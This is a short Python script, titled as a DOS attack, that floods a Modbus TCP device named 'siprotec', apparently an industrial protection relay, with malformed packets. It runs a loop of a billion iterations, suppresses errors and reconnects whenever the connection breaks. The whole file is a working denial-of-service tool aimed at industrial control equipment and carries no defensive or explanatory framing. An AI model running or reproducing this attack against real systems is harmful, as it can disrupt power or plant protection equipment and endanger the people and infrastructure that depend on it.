# DOS attack with a randomly chosen 1 or 0 signal

from pymodbus.client.sync import ModbusTcpClient
import random
import socket

# Server details
server_ip = "siprotec"
server_port = 502

# Create a Modbus TCP client
client = ModbusTcpClient(server_ip, port=server_port)

# Send a malformed Modbus packet to the siprotec
def send_malformed_packet():
    try:
        # Connect to the Modbus server
        if not client.connect():
            return

        # Choose between 0xFF and 0x00 randomly
        chosen_value = random.choice([0xFF, 0x00])

        # Craft a malformed Modbus packet
        malformed_packet = bytes([0xFF] * 10 + [chosen_value] + [0xFF] * 2)
        
        # Send the malformed packet
        response = client.send(malformed_packet)

    # Ignore server side errors
    except BrokenPipeError:
        # Handle the BrokenPipeError
        client.close()
        client.connect()
    except Exception as e:
        pass
    finally:
        pass

# dos
for i in range(1000000000):
    send_malformed_packet()
